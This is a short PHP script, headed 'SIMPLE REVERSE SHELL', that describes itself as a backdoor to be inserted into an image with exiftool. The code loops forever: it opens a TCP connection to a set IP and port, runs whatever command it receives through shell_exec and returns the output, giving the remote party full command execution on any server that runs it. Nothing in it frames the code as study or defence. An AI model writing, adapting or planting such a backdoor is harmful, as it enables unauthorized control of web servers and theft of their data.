<?php

/*
--------------------------------------------------------
                SIMPLE REVERSE SHELL

This script to insert backdoor in image with exiftool

Exiftool download : https://exiftool.org/

--------------------------------------------------------
*/

$ip = '127.0.0.1'; 
$port = 4444;

while (true) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    $result = socket_connect($socket, $ip, $port);
    $read = socket_read($socket, 1024);
    $output = shell_exec($read);
    socket_write($socket, $output, strlen($output));
}
